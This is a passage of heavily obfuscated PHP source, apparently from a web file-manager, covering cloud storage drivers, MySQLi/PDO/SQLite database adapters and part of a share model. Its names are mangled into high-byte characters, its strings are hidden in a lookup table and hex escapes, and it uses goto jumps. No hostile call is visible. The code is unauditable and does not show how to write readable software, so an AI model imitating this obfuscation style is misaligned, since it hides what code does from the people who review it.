(!$ÀÍçê‡˜) { $this->writeLog(__FUNCTION__ . $_SERVER[ıÚ˜š²İ][1472], !0); } clearstatcache(); @chmod($å’ë°ú, $this->pathAuth); return $ÀÍçê‡˜ === !1 ? !1 : !0; } public function fileSubstr($ çËß‹, $«íÓ“› = 0, $Ôó°ş—‰ = false) { $äòöÆÅ– =& $_SERVER[ıÚ˜š²İ]; $ çËß‹ = $this->iconvSystem($ çËß‹); if ($Ôó°ş—‰ === !1) { $Ôó°ş—‰ = $this->size($ çËß‹); } if ($Ôó°ş—‰ <= 0) { return $äòöÆÅ–[12]; } $‹»Øäöõ = fopen($ çËß‹, $äòöÆÅ–[1480]); if (!$‹»Øäöõ) { return !1; } fseek_64($‹»Øäöõ, $«íÓ“›); $Ô¼â°º· = fread($‹»Øäöõ, $Ôó°ş—‰); fclose($‹»Øäöõ); if (!$Ô¼â°º·) { $this->writeLog(__FUNCTION__ . $äòöÆÅ–[1472], !0); } return $Ô¼â°º·; } public function upload($´’èèİ¥, $™çŸìêñ, $è„óÅå§ = false, $ÇµÜÖ£Ò = REPEAT_REPLACE) { if ($è„óÅå§) { return $this->moveFile($™çŸìêñ, $´’èèİ¥); } return $this->copyFile($™çŸìêñ, $´’èèİ¥); } public function setModifyTime($²Ö¿–ø, $šû¨¹ş‡ = '') { @touch($²Ö¿–ø, intval($šû¨¹ş‡)); } public function download($¢²— ¦÷, $¦¼×ƒ§È) { return $this->iconvSystem($¢²— ¦÷); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($¡Å­¹ˆ½) { parent::__construct($¡Å­¹ˆ½); $this->setSignVersion($_SERVER[ıÚ˜š²İ][250]); } public function fileOutImage($Ñ¥ŸÜšš, $´é¥¡‰ß = 250) { $÷Š¤òƒù =& $_SERVER[ıÚ˜š²İ]; if ($this->size($Ñ¥ŸÜšš) > 1024 * 1024 * 25) { return $this->fileOutImageServer($Ñ¥ŸÜšš, $´é¥¡‰ß); } $”½……» = array($÷Š¤òƒù[1481] => $÷Š¤òƒù[1482] . $´é¥¡‰ß . $÷Š¤òƒù[1483]); $Ÿñœ®ù¼ = $this->link($Ñ¥ŸÜšš, $”½……»); $this->fileOutLink($Ÿñœ®ù¼); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ä•»¹‚ó) { parent::__construct($ä•»¹‚ó); $this->setSignVersion($_SERVER[ıÚ˜š²İ][250]); } public function uploadFormData($ÎŠÓ‡—µ, $ßìÙ‰ªí = 3600) { return $this->uploadFormDataV2($ÎŠÓ‡—µ, $ßìÙ‰ªí); } } goto BŞå£„´‹™; Cé–¬İ¼Ë: class DbMysqli extends Db { public function __construct($û³ì—ùà = '') { $Ä›ç›Ü¥ =& $_SERVER[ıÚ˜š²İ]; if (!extension_loaded($Ä›ç›Ü¥[1001])) { think_exception(think_lang($Ä›ç›Ü¥[14]) . $Ä›ç›Ü¥[1002]); } if (!empty($û³ì—ùà)) { $this->config = $û³ì—ùà; if (empty($this->config[$Ä›ç›Ü¥[17]])) { $this->config[$Ä›ç›Ü¥[17]] = $Ä›ç›Ü¥[12]; } } } public function connect($…ñ‰ŒœÃ = '', $ª‰ï×‚Í = 0) { $šñİãö¬ =& $_SERVER[ıÚ˜š²İ]; if (!isset($this->linkID[$ª‰ï×‚Í])) { if (empty($…ñ‰ŒœÃ)) { $…ñ‰ŒœÃ = $this->config; } $this->linkID[$ª‰ï×‚Í] = new mysqli($…ñ‰ŒœÃ[$šñİãö¬[975]], $…ñ‰ŒœÃ[$šñİãö¬[977]], $…ñ‰ŒœÃ[$šñİãö¬[978]], $…ñ‰ŒœÃ[$šñİãö¬[21]], $…ñ‰ŒœÃ[$šñİãö¬[976]] ? intval($…ñ‰ŒœÃ[$šñİãö¬[976]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $¸¤¨á‚ã = $this->linkID[$ª‰ï×‚Í]->server_version; $this->linkID[$ª‰ï×‚Í]->query($šñİãö¬[979] . think_config($šñİãö¬[980]) . $šñİãö¬[58]); if ($¸¤¨á‚ã > $šñİãö¬[981]) { $this->linkID[$ª‰ï×‚Í]->query($šñİãö¬[982]); } $this->connected = !0; if (1 != think_config($šñİãö¬[22])) { unset($this->config); } } return $this->linkID[$ª‰ï×‚Í]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($êó¶çÓÔ) { $É¯ˆ»ŒÇ =& $_SERVER[ıÚ˜š²İ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $êó¶çÓÔ; if ($this->queryID) { $this->free(); } think_action_status($É¯ˆ»ŒÇ[23], 1); think_status($É¯ˆ»ŒÇ[24]); $this->queryID = $this->_linkID->query($êó¶çÓÔ); if ($this->_linkID->more_results()) { while (($³ºã¡› = $this->_linkID->next_result()) != NULL) { $³ºã¡›->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ûÅ÷‹‹Ü) { $´ñ¯â–¢ =& $_SERVER[ıÚ˜š²İ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ûÅ÷‹‹Ü; if ($this->queryID) { $this->free(); } think_action_status($´ñ¯â–¢[25], 1); think_status($´ñ¯â–¢[24]); $ÀÛ«ŒËÔ = $this->_linkID->query($ûÅ÷‹‹Ü); $this->debug(); if (!1 === $ÀÛ«ŒËÔ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $˜ĞÎ„äú = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$˜ĞÎ„äú) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ªËµ¹ê¶ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ªËµ¹ê¶) { $this->error(); return !1; } } return !0; } private function getAll() { $àÌŞš¾ê = array(); if ($this->numRows > 0) { for ($ù€Ô©£· = 0; $ù€Ô©£· < $this->numRows; $ù€Ô©£·++) { $àÌŞš¾ê[$ù€Ô©£·] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $àÌŞš¾ê; } public function getFields($Ñ¹í’–•) { $óŠ–¯–» =& $_SERVER[ıÚ˜š²İ]; $üÓÙŞ· = $this->query($óŠ–¯–»[986] . $this->parseKey($Ñ¹í’–•)); $æªÈíŞ² = array(); if ($üÓÙŞ·) { foreach ($üÓÙŞ· as $ÉîÕ¡Ç => $×´éåÁÌ) { $æªÈíŞ²[$×´éåÁÌ[$óŠ–¯–»[31]]] = array($óŠ–¯–»[32] => $×´éåÁÌ[$óŠ–¯–»[31]], $óŠ–¯–»[33] => $×´éåÁÌ[$óŠ–¯–»[34]], $óŠ–¯–»[35] => (bool) ($×´éåÁÌ[$óŠ–¯–»[36]] === $óŠ–¯–»[12]), $óŠ–¯–»[37] => $×´éåÁÌ[$óŠ–¯–»[38]], $óŠ–¯–»[39] => strtolower($×´éåÁÌ[$óŠ–¯–»[40]]) == $óŠ–¯–»[41], $óŠ–¯–»[42] => strtolower($×´éåÁÌ[$óŠ–¯–»[43]]) == $óŠ–¯–»[44]); } } return $æªÈíŞ²; } public function getTables($¢Õ¸½Ûè = '') { $ú‹ÁÎÌ‰ =& $_SERVER[ıÚ˜š²İ]; $”èÉù¶² = !empty($¢Õ¸½Ûè) ? $ú‹ÁÎÌ‰[988] . $¢Õ¸½Ûè . $ú‹ÁÎÌ‰[989] : $ú‹ÁÎÌ‰[990]; $—óóÄ®Ğ = $this->query($”èÉù¶²); $Üêé²Ç¨ = array(); if ($—óóÄ®Ğ) { foreach ($—óóÄ®Ğ as $›£…€¨® => $è»„ú¦û) { $Üêé²Ç¨[$›£…€¨®] = current($è»„ú¦û); } } return $Üêé²Ç¨; } public function replace($ô Ä³ã, $ı—³º­ê = array()) { $áîæş¦Ü =& $_SERVER[ıÚ˜š²İ]; foreach ($ô Ä³ã as $çŒì–¯ => $µ»Í¡ó¿) { $‚”¹ÅÕ¿ = $this->parseValue($µ»Í¡ó¿); if (is_scalar($‚”¹ÅÕ¿)) { $Ì×†Í†Á[] = $‚”¹ÅÕ¿; $ŒÅÏŠ¹[] = $this->parseKey($çŒì–¯); } } $Ô—ô÷Õú = $áîæş¦Ü[991] . $this->parseTable($ı—³º­ê[$áîæş¦Ü[359]]) . $áîæş¦Ü[992] . implode($áîæş¦Ü[50], $ŒÅÏŠ¹) . $áîæş¦Ü[993] . implode($áîæş¦Ü[50], $Ì×†Í†Á) . $áîæş¦Ü[994]; return $this->execute($Ô—ô÷Õú); } public function insertAll($È¥§æ†, $¹é¬’£‹ = array(), $é˜•ÇÂÖ = false) { $æ¢£½†À =& $_SERVER[ıÚ˜š²İ]; if (!is_array($È¥§æ†[0])) { return !1; } $ŒÍéô´ = array_keys($È¥§æ†[0]); $º‚¤ü = array(); foreach ($È¥§æ† as $«‚Şñˆß) { $é×ãú“Ç = array(); foreach ($«‚Şñˆß as $´ª‘…ö… => $õÚ£ïª) { $õÚ£ïª = $this->parseValue($õÚ£ïª); if (is_scalar($õÚ£ïª)) { $é×ãú“Ç[] = $õÚ£ïª; } } $º‚¤ü[] = $æ¢£½†À[340] . implode($æ¢£½†À[50], $é×ãú“Ç) . $æ¢£½†À[994]; } array_walk($ŒÍéô´, array($this, $æ¢£½†À[995])); $ğ²˜ò¯õ = $é˜•ÇÂÖ ? $æ¢£½†À[996] : $æ¢£½†À[997]; $‡°¨’¶¹ = $ğ²˜ò¯õ . $æ¢£½†À[998] . $this->parseTable($¹é¬’£‹[$æ¢£½†À[359]]) . $æ¢£½†À[992] . implode($æ¢£½†À[50], $ŒÍéô´) . $æ¢£½†À[999] . implode($æ¢£½†À[50], $º‚¤ü); return $this->execute($‡°¨’¶¹); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $¡­øñïÅ =& $_SERVER[ıÚ˜š²İ]; $this->error = $this->_linkID->errno . $¡­øñïÅ[4] . $this->_linkID->error; if ($¡­øñïÅ[12] != $this->queryStr) { $this->error .= LNG($¡­øñïÅ[48]) . $this->queryStr; } think_trace($this->error, $¡­øñïÅ[12], $¡­øñïÅ[49]); return $this->error; } public function escapeString($ó¾î¸é”) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ó¾î¸é”); } else { return addslashes($ó¾î¸é”); } } public function parseKey(&$©ÛŠ»şï, $·Íúßˆ = true) { $Ä¶ë¨Ì´ =& $_SERVER[ıÚ˜š²İ]; if ($·Íúßˆ) { $©ÛŠ»şï = $this->parseKeyCheck($©ÛŠ»şï); } if ($©ÛŠ»şï != $Ä¶ë¨Ì´[223] && !preg_match($Ä¶ë¨Ì´[1000], $©ÛŠ»şï)) { $©ÛŠ»şï = $Ä¶ë¨Ì´[463] . trim($©ÛŠ»şï, $Ä¶ë¨Ì´[463]) . $Ä¶ë¨Ì´[463]; } return $©ÛŠ»şï; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($Ğ™…¬×â = '') { $¢•ˆ’åÖ =& $_SERVER[ıÚ˜š²İ]; if (!class_exists($¢•ˆ’åÖ[1003])) { think_exception(think_lang($¢•ˆ’åÖ[14]) . $¢•ˆ’åÖ[1004]); } if (!empty($Ğ™…¬×â)) { $this->config = $Ğ™…¬×â; if (empty($this->config[$¢•ˆ’åÖ[17]])) { $this->config[$¢•ˆ’åÖ[17]] = array(); } } } public function connect($ÆÚ§Î½ = '', $üÚ—ì = 0) { $È¯Îæš =& $_SERVER[ıÚ˜š²İ]; if (!isset($this->linkID[$üÚ—ì])) { if (empty($ÆÚ§Î½)) { $ÆÚ§Î½ = $this->config; } $‹ğïÅî = !empty($ÆÚ§Î½[$È¯Îæš[17]][$È¯Îæš[18]]) ? $ÆÚ§Î½[$È¯Îæš[17]][$È¯Îæš[18]] : $this->pconnect; if ($‹ğïÅî) { $ÆÚ§Î½[$È¯Îæš[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$üÚ—ì] = new PDO($ÆÚ§Î½[$È¯Îæš[1005]], $ÆÚ§Î½[$È¯Îæš[977]], $ÆÚ§Î½[$È¯Îæš[978]], $ÆÚ§Î½[$È¯Îæš[17]]); } catch (PDOException $§±Ü©š¬) { think_exception($§±Ü©š¬->getMessage()); } $this->dbType = $this->_getDsnType($ÆÚ§Î½[$È¯Îæš[1005]]); if (in_array($this->dbType, array($È¯Îæš[1006], $È¯Îæš[1007], $È¯Îæš[1008], $È¯Îæš[1009]))) { think_exception($È¯Îæš[1010] . $this->dbType . $È¯Îæš[1011] . $this->dbType . $È¯Îæš[1012]); } if (!$this->linkID[$üÚ—ì]) { think_exception($È¯Îæš[1013]); } try { $this->linkID[$üÚ—ì]->exec($È¯Îæš[1014] . think_config($È¯Îæš[980])); } catch (Exception $§±Ü©š¬) { } $this->connected = !0; if (1 != think_config($È¯Îæš[22])) { unset($this->config); } } return $this->linkID[$üÚ—ì]; } public function free() { $this->PDOStatement = null; } public function query($õ Ñ›¾, $Â’åØ¹ = array()) { $İ÷åù• =& $_SERVER[ıÚ˜š²İ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $õ Ñ›¾; if (!empty($Â’åØ¹)) { $this->queryStr .= $İ÷åù•[1015] . print_r($Â’åØ¹, !0) . $İ÷åù•[1016]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($İ÷åù•[23], 1); think_status($İ÷åù•[24]); $this->PDOStatement = $this->_linkID->prepare($õ Ñ›¾); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ªìë‚¸ = $this->PDOStatement->execute($Â’åØ¹); $this->debug(); if (!1 === $ªìë‚¸) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($³Åóİ²ü, $ĞÑêĞ„¤ = array()) { $éÈÂÔÎ =& $_SERVER[ıÚ˜š²İ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $³Åóİ²ü; if (!empty($ĞÑêĞ„¤)) { $this->queryStr .= $éÈÂÔÎ[1015] . print_r($ĞÑêĞ„¤, !0) . $éÈÂÔÎ[1016]; } $ú²ÖÔ = !1; if ($this->dbType == $éÈÂÔÎ[1009]) { if (preg_match($éÈÂÔÎ[1017], $this->queryStr, $Åøš‚‰–)) { $this->table = think_config($éÈÂÔÎ[1018]) . str_ireplace(think_config($éÈÂÔÎ[1019]), $éÈÂÔÎ[456], $Åøš‚‰–[2]); $ú²ÖÔ = (bool) $this->query($éÈÂÔÎ[1020] . strtoupper($this->table) . $éÈÂÔÎ[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($éÈÂÔÎ[25], 1); think_status($éÈÂÔÎ[24]); $this->PDOStatement = $this->_linkID->prepare($³Åóİ²ü); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Áë»²Şë = $this->PDOStatement->execute($ĞÑêĞ„¤); $this->debug(); if (!1 === $Áë»²Şë) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ú²ÖÔ || preg_match($éÈÂÔÎ[1021], $³Åóİ²ü)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Æ¡úîù = $this->_linkID->commit(); $this->transTimes = 0; if (!$Æ¡úîù) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $‰Œ…§¤Œ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$‰Œ…§¤Œ) { $this->error(); return !1; } } return !0; } private function getAll() { $¡«öàòÇ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($¡«öàòÇ); return $¡«öàòÇ; } public function getFields($¸£¯Ãç) { $üŠ‡¿æ† =& $_SERVER[ıÚ˜š²İ]; $this->initConnect(!0); if (think_config($üŠ‡¿æ†[1022])) { $­Ô‚¯îà = str_replace($üŠ‡¿æ†[1023], $¸£¯Ãç, think_config($üŠ‡¿æ†[1022])); } else { switch ($this->dbType) { case $üŠ‡¿æ†[1006]: case $üŠ‡¿æ†[1024]: $­Ô‚¯îà = "\123\105\114\x45\103\124\40\40\40\x63\x6f\x6c\165\155\156\137\156\141\x6d\145\40\141\163\x20\x27\x4e\x61\155\x65\x27\54\x20\x20\40\144\141\x74\141\x5f\164\171\x70\145\x20\x61\163\40\x27\x54\171\160\145\x27\x2c\x20\x20\x20\143\157\154\165\155\x6e\x5f\144\x65\146\141\x75\x6c\x74\x20\141\163\x20\47\x44\x65\146\x61\165\154\164\x27\54\40\x20\x20\x69\x73\137\156\x75\154\x6c\x61\142\x6c\145\x20\141\163\40\47\x4e\x75\x6c\x6c\47\xa\11\11\x46\x52\117\115\11\x69\156\x66\x6f\162\155\141\x74\x69\157\156\x5f\x73\x63\x68\x65\155\141\56\164\141\142\x6c\145\x73\40\x41\x53\x20\164\12\x9\x9\x4a\117\x49\116\11\x69\156\x66\x6f\162\x6d\x61\164\x69\157\x6e\x5f\163\143\x68\x65\x6d\x61\x2e\x63\157\154\x75\155\156\x73\x20\101\123\40\143\xa\x9\11\117\116\x20\40\x74\56\164\x61\x62\154\x65\x5f\x63\x61\x74\x61\x6c\x6f\147\x20\75\40\143\56\164\141\142\154\145\137\x63\x61\164\x61\154\x6f\x67\12\x9\11\101\x4e\104\40\x74\56\x74\141\142\154\145\x5f\x73\x63\150\x65\x6d\x61\40\x3d\40\143\56\164\x61\142\154\x65\x5f\x73\x63\150\x65\x6d\141\xa\11\11\x41\x4e\x44\40\164\x2e\164\x61\x62\154\145\137\x6e\141\155\145\x20\75\40\143\x2e\x74\x61\x62\x6c\145\137\x6e\141\x6d\145\12\11\x9\x57\110\105\x52\x45\x20\40\40\164\56\x74\141\x62\154\145\137\156\x61\x6d\x65\40\x3d\x20\x27{$¸£¯Ãç}\47"; break; case $üŠ‡¿æ†[1025]: $­Ô‚¯îà = $üŠ‡¿æ†[1026] . $¸£¯Ãç . $üŠ‡¿æ†[1027]; break; case $üŠ‡¿æ†[1007]: case $üŠ‡¿æ†[1009]: $­Ô‚¯îà = $üŠ‡¿æ†[1028] . $üŠ‡¿æ†[1029] . $üŠ‡¿æ†[1030] . strtoupper($¸£¯Ãç) . $üŠ‡¿æ†[1031] . strtoupper($¸£¯Ãç) . $üŠ‡¿æ†[1032]; break; case $üŠ‡¿æ†[1033]: $­Ô‚¯îà = $üŠ‡¿æ†[1034] . $¸£¯Ãç . $üŠ‡¿æ†[1035]; break; case $üŠ‡¿æ†[1008]: break; case $üŠ‡¿æ†[1036]: default: $­Ô‚¯îà = $üŠ‡¿æ†[1037] . ($this->dbType == $üŠ‡¿æ†[1036] ? "\x60{$¸£¯Ãç}\x60" : $¸£¯Ãç); } } $Ïñæü…¡ = $this->query($­Ô‚¯îà); $áØ‘¡’ê = array(); if ($Ïñæü…¡) { foreach ($Ïñæü…¡ as $ó¥Ääàí => $Áªšª§¬) { $Áªšª§¬ = array_change_key_case($Áªšª§¬); $Áªšª§¬[$üŠ‡¿æ†[32]] = isset($Áªšª§¬[$üŠ‡¿æ†[32]]) ? $Áªšª§¬[$üŠ‡¿æ†[32]] : $üŠ‡¿æ†[456]; $Áªšª§¬[$üŠ‡¿æ†[33]] = isset($Áªšª§¬[$üŠ‡¿æ†[33]]) ? $Áªšª§¬[$üŠ‡¿æ†[33]] : $üŠ‡¿æ†[456]; $úÈ€‚šŠ = isset($Áªšª§¬[$üŠ‡¿æ†[353]]) ? $Áªšª§¬[$üŠ‡¿æ†[353]] : $Áªšª§¬[$üŠ‡¿æ†[32]]; $áØ‘¡’ê[$úÈ€‚šŠ] = array($üŠ‡¿æ†[32] => $úÈ€‚šŠ, $üŠ‡¿æ†[33] => $Áªšª§¬[$üŠ‡¿æ†[33]], $üŠ‡¿æ†[35] => (bool) (isset($Áªšª§¬[$üŠ‡¿æ†[106]]) && $Áªšª§¬[$üŠ‡¿æ†[106]] === $üŠ‡¿æ†[12] || isset($Áªšª§¬[$üŠ‡¿æ†[35]]) && $Áªšª§¬[$üŠ‡¿æ†[35]] === $üŠ‡¿æ†[12]), $üŠ‡¿æ†[37] => isset($Áªšª§¬[$üŠ‡¿æ†[37]]) ? $Áªšª§¬[$üŠ‡¿æ†[37]] : (isset($Áªšª§¬[$üŠ‡¿æ†[56]]) ? $Áªšª§¬[$üŠ‡¿æ†[56]] : $üŠ‡¿æ†[456]), $üŠ‡¿æ†[39] => isset($Áªšª§¬[$üŠ‡¿æ†[97]]) ? strtolower($Áªšª§¬[$üŠ‡¿æ†[97]]) == $üŠ‡¿æ†[41] : (isset($Áªšª§¬[$üŠ‡¿æ†[57]]) ? $Áªšª§¬[$üŠ‡¿æ†[57]] : !1), $üŠ‡¿æ†[42] => isset($Áªšª§¬[$üŠ‡¿æ†[1038]]) ? strtolower($Áªšª§¬[$üŠ‡¿æ†[1038]]) == $üŠ‡¿æ†[44] : (isset($Áªšª§¬[$üŠ‡¿æ†[97]]) ? $Áªšª§¬[$üŠ‡¿æ†[97]] : !1)); } } return $áØ‘¡’ê; } public function getTables($ç·ºõ¸¬ = '') { $êø®õµŠ =& $_SERVER[ıÚ˜š²İ]; if (think_config($êø®õµŠ[1039])) { $ÍóúÅêò = str_replace($êø®õµŠ[1040], $ç·ºõ¸¬, think_config($êø®õµŠ[1039])); } else { switch ($this->dbType) { case $êø®õµŠ[1007]: case $êø®õµŠ[1009]: $ÍóúÅêò = $êø®õµŠ[1041]; break; case $êø®õµŠ[1006]: case $êø®õµŠ[1024]: $ÍóúÅêò = $êø®õµŠ[1042]; break; case $êø®õµŠ[1033]: $ÍóúÅêò = $êø®õµŠ[1043]; break; case $êø®õµŠ[1008]: think_exception(think_lang($êø®õµŠ[1044]) . $êø®õµŠ[1045]); break; case $êø®õµŠ[1025]: $ÍóúÅêò = $êø®õµŠ[45] . $êø®õµŠ[46] . $êø®õµŠ[47]; break; case $êø®õµŠ[1036]: default: if (!empty($ç·ºõ¸¬)) { $ÍóúÅêò = $êø®õµŠ[988] . $ç·ºõ¸¬ . $êø®õµŠ[989]; } else { $ÍóúÅêò = $êø®õµŠ[990]; } } } $ÈôÄŸŸÄ = $this->query($ÍóúÅêò); $–†Ÿ ßÀ = array(); foreach ($ÈôÄŸŸÄ as $¤úûÛüÛ => $ÚôßÍÓå) { $–†Ÿ ßÀ[$¤úûÛüÛ] = current($ÚôßÍÓå); } return $–†Ÿ ßÀ; } protected function parseLimit($‹Æû©Ç¯) { $…¹”ø¨Û =& $_SERVER[ıÚ˜š²İ]; $ÀíÑÎ§ = $…¹”ø¨Û[12]; if (!empty($‹Æû©Ç¯)) { switch ($this->dbType) { case $…¹”ø¨Û[1033]: case $…¹”ø¨Û[1025]: $‹Æû©Ç¯ = explode($…¹”ø¨Û[50], $‹Æû©Ç¯); if (count($‹Æû©Ç¯) > 1) { $ÀíÑÎ§ .= $…¹”ø¨Û[51] . $‹Æû©Ç¯[1] . $…¹”ø¨Û[52] . $‹Æû©Ç¯[0] . $…¹”ø¨Û[53]; } else { $ÀíÑÎ§ .= $…¹”ø¨Û[51] . $‹Æû©Ç¯[0] . $…¹”ø¨Û[53]; } break; case $…¹”ø¨Û[1006]: case $…¹”ø¨Û[1024]: break; case $…¹”ø¨Û[1008]: break; case $…¹”ø¨Û[1007]: case $…¹”ø¨Û[1009]: break; case $…¹”ø¨Û[1036]: default: $ÀíÑÎ§ .= $…¹”ø¨Û[51] . $‹Æû©Ç¯ . $…¹”ø¨Û[53]; } } return $ÀíÑÎ§; } public function parseKey(&$­±ÂÉ”×, $âˆï½¤É = true) { $“ã­Ñµ™ =& $_SERVER[ıÚ˜š²İ]; if ($âˆï½¤É) { $­±ÂÉ”× = $this->parseKeyCheck($­±ÂÉ”×); } if ($this->dbType == $“ã­Ñµ™[1036]) { if ($­±ÂÉ”× != $“ã­Ñµ™[223] && !preg_match($“ã­Ñµ™[1000], $­±ÂÉ”×)) { $­±ÂÉ”× = $“ã­Ñµ™[463] . trim($­±ÂÉ”×, $“ã­Ñµ™[463]) . $“ã­Ñµ™[463]; } return $­±ÂÉ”×; } else { return parent::parseKey($­±ÂÉ”×, $âˆï½¤É); } } public function close() { $this->_linkID = null; } public function error() { $¦õÊäâ¸ =& $_SERVER[ıÚ˜š²İ]; if ($this->PDOStatement) { $ïÉ×ÛÜ· = $this->PDOStatement->errorInfo(); $this->error = $ïÉ×ÛÜ·[1] . $¦õÊäâ¸[4] . $ïÉ×ÛÜ·[2]; } else { $this->error = $¦õÊäâ¸[12]; } if ($¦õÊäâ¸[12] != $this->queryStr) { $this->error .= LNG($¦õÊäâ¸[48]) . $this->queryStr; } think_trace($this->error, $¦õÊäâ¸[12], $¦õÊäâ¸[49]); return $this->error; } public function escapeString($Ù•‘®æÕ) { $şã¼¹î =& $_SERVER[ıÚ˜š²İ]; switch ($this->dbType) { case $şã¼¹î[1033]: case $şã¼¹î[1006]: case $şã¼¹î[1024]: case $şã¼¹î[1036]: return addslashes($Ù•‘®æÕ); case $şã¼¹î[1008]: case $şã¼¹î[1025]: case $şã¼¹î[1007]: case $şã¼¹î[1009]: return str_ireplace($şã¼¹î[58], $şã¼¹î[59], $Ù•‘®æÕ); } } protected function parseValue($ı‚¾ĞŞ) { $ŞÔßê´ì =& $_SERVER[ıÚ˜š²İ]; if (is_string($ı‚¾ĞŞ)) { $ó®‚´ÒŸ = strpos($ı‚¾ĞŞ, $ŞÔßê´ì[4]) === 0 && in_array($ı‚¾ĞŞ, array_keys($this->bind)); $ı‚¾ĞŞ = $ó®‚´ÒŸ ? $this->escapeString($ı‚¾ĞŞ) : $ŞÔßê´ì[1046] . $this->escapeString($ı‚¾ĞŞ) . $ŞÔßê´ì[1046]; } elseif (isset($ı‚¾ĞŞ[0]) && is_string($ı‚¾ĞŞ[0]) && strtolower($ı‚¾ĞŞ[0]) == $ŞÔßê´ì[374]) { $ı‚¾ĞŞ = $this->escapeString($ı‚¾ĞŞ[1]); } elseif (is_array($ı‚¾ĞŞ)) { $ı‚¾ĞŞ = array_map(array($this, $ŞÔßê´ì[1047]), $ı‚¾ĞŞ); } elseif (is_bool($ı‚¾ĞŞ)) { $ı‚¾ĞŞ = $ı‚¾ĞŞ ? $ŞÔßê´ì[91] : $ŞÔßê´ì[231]; } elseif (is_null($ı‚¾ĞŞ)) { $ı‚¾ĞŞ = $ŞÔßê´ì[106]; } return $ı‚¾ĞŞ; } public function getLastInsertId() { $â¤¥Ùëş =& $_SERVER[ıÚ˜š²İ]; switch ($this->dbType) { case $â¤¥Ùëş[1033]: case $â¤¥Ùëş[1025]: case $â¤¥Ùëş[1006]: case $â¤¥Ùëş[1024]: case $â¤¥Ùëş[1008]: case $â¤¥Ùëş[1036]: return $this->_linkID->lastInsertId(); case $â¤¥Ùëş[1007]: case $â¤¥Ùëş[1009]: $Øá—øÇö = $this->table; $æÁ‚çÖÅ = $this->query("\x53\x45\x4c\105\x43\124\x20{$Øá—øÇö}\56\x63\165\162\x72\x76\141\154\x20\143\x75\162\162\x76\x61\x6c\40\x46\122\117\115\x20\x64\x75\141\154"); return $æÁ‚çÖÅ ? $æÁ‚çÖÅ[0][$â¤¥Ùëş[1048]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($Œóö­‹) { $‰İşé‚· =& $_SERVER[ıÚ˜š²İ]; if (!CacheLock::fileLock($‰İşé‚·[13])) { return !1; } $°îı±×» = parent::query($Œóö­‹); CacheLock::fileUnLock($‰İşé‚·[13]); return $°îı±×»; } public function execute($è¡ áÆä) { $ñ® ”Ô =& $_SERVER[ıÚ˜š²İ]; if (!CacheLock::fileLock($ñ® ”Ô[13])) { return !1; } $ñô¸• = parent::execute($è¡ áÆä); CacheLock::fileUnLock($ñ® ”Ô[13]); return $ñô¸•; } } goto E†ñéÁ©¨õ; eéâ“Š¾Š: class ShareModel extends ModelBase { protected $tableName = "\x73\150\x61\162\145"; protected $dataAuto = array(array("\155\157\x64\151\146\171\124\151\155\145", "\x74\x69\x6d\145", "\151\156\x73\x65\162\x74\54\165\x70\144\141\164\145", "\x66\x75\x6e\143\164\x69\x6f\156"), array("\x63\x72\x65\141\164\x65\x54\151\155\145", "\164\151\x6d\x65", "\151\156\163\145\162\164", "\146\165\x6e\x63\164\151\x6f\156"), array("\157\160\x74\x69\x6f\x6e\163", '', "\151\156\163\145\x72\164\54\165\160\144\x61\x74\145\54\163\x65\154\x65\143\x74", "\152\163\x6f\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($Ä´È‚“¢) { $Ğ”ĞÕ˜ =& $_SERVER[ıÚ˜š²İ]; $‚óªìôŞ = isset($Ä´È‚“¢[0]) ? $Ä´È‚“¢[0] : !1; $©–é¶ø– = $Ğ”ĞÕ˜[2137] . USER_ID; return array($Ğ”ĞÕ˜[2138] => array(USER_ID, $Ğ”ĞÕ˜[2139]), $Ğ”ĞÕ˜[2077] => array($‚óªìôŞ, $Ğ”ĞÕ˜[2140], $©–é¶ø–)); } protected function listSimple() { $Û­†óå¨ = array($_SERVER[ıÚ˜š²İ][1792] => USER_ID); $ºğÀèŞ = $this->field($this->fieldList)->where($Û­†óå¨)->select(); return $ºğÀèŞ ? $ºğÀèŞ : array(); } protected function getInfo($‘ùÚ¹°¼, $®·ƒûİ = false, $“ ¶–Ä¶ = '') { $¢šÕ Í =& $_SERVER[ıÚ˜š²İ]; 